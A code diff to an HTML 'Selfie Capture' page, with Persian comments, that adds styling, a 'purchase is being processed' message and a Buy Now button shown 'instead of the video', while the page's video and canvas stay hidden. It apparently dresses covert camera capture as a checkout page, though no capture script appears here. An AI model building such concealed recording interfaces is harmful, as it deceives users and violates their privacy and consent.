@@ -9,10 +9,42 @@
     #video, #canvas {
       display: none;
     }
+
+    /* استایل برای نمایش متن */
+    #message {
+      font-size: 20px;
+      color: #333;
+      text-align: center;
+      margin-top: 20px;
+    }
+
+    /* استایل دکمه خریدن */
+    #buyButton {
+      display: block;
+      width: 200px;
+      padding: 10px;
+      margin: 20px auto;
+      background-color: #4CAF50;
+      color: white;
+      font-size: 16px;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+
+    #buyButton:hover {
+      background-color: #45a049;
+    }
   </style>
 </head>
 <body>
-  <h1>Selfie Capture</h1>
+  <h1 style="text-align: center;">Welcome to the Selfie Capture Page</h1>
+
+  <!-- نمایش پیام به جای ویدیو -->
+  <div id="message">Please wait while the purchase is being processed...</div>
+
+  <!-- دکمه خریدن -->
+  <button id="buyButton" onclick="alert('Proceeding to buy...')">Buy Now</button>
 
   <video id="video" width="640" height="480" autoplay></video>
   <canvas id="canvas" width="640" height="480"></canvas>
